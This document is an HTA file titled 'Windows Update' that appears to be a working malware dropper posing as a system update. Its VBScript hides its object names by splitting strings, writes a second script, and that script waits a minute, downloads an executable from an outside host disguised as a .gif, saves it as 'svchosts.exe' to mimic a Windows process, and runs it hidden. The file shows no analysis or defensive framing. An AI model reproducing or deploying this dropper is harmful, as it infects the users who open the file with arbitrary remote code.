<HTML>
<HEAD>
<TITLE>Windows Update</TITLE>
<HTA:APPLICATION ID="Q" APPLICATIONNAME="Q" BORDER="none" BORDERSTYLE="normal" CAPTION="no" ICON="" CONTEXTMENU="no" MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no" SHOWINTASKBAR="no" SINGLEINSTANCE="no" SYSMENU="no" VERSION="1.0" WINDOWSTATE="minimize"/>
<SCRIPT LANGUAGE="VBScript">
MyFile = "q.vbs"
drte52f = "ileSyst"
Set FSO = CreateObject("Scripting.F"+drte52f+"emObject")
Set TSO = FSO.CreateTextFile(MyFile, True)
TSO.write "Dim BD" & vbcrlf
TSO.write "Dim xml" & vbcrlf
TSO.write "WScript.Sleep(60000)" & vbcrlf
TSO.write "f5j545i = ""MLH""" & vbcrlf
TSO.write "Set xml = CreateObject(""Microsoft.X""+f5j545i+""TTP"")" & vbcrlf
TSO.write "xml.Open ""GET"", ""http://alcatrazhistory.com/1.gif"", False" & vbcrlf
TSO.write "xml.Send" & vbcrlf
TSO.write "C=C=C=C" & vbcrlf
TSO.write "BD = xml.ResponseBody" & vbcrlf
TSO.write "C=C=C=C" & vbcrlf
TSO.write "Const adTypeBinary = 1" & vbcrlf
TSO.write "Const adSaveCreateOverWrite = 2" & vbcrlf
TSO.write "C=C=C=C" & vbcrlf
TSO.write "Dim BinaryStream" & vbcrlf
TSO.write "C=C=C=C" & vbcrlf
TSO.write "Set BinaryStream = CreateObject(""ADODB.Stream"")" & vbcrlf
TSO.write "BinaryStream.Type = adTypeBinary" & vbcrlf
TSO.write "A=A=A=A" & vbcrlf
TSO.write "BinaryStream.Open" & vbcrlf
TSO.write "BinaryStream.Write BD" & vbcrlf
TSO.write "b=b=b=b" & vbcrlf
TSO.write "BinaryStream.SaveToFile ""svchosts.exe"", adSaveCreateOverWrite" & vbcrlf
TSO.write "Dim WshShell" & vbcrlf
TSO.write "Set WshShell = CreateObject(""WScript.Shell"")" & vbcrlf
TSO.write "WshShell.Run ""svchosts.exe"", 0, false" & vbcrlf
TSO.close
Set TSO = Nothing
Set FSO = Nothing
Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "q.vbs", 0, false
</SCRIPT>
<script>window.close()</script>
</HEAD>
</html>
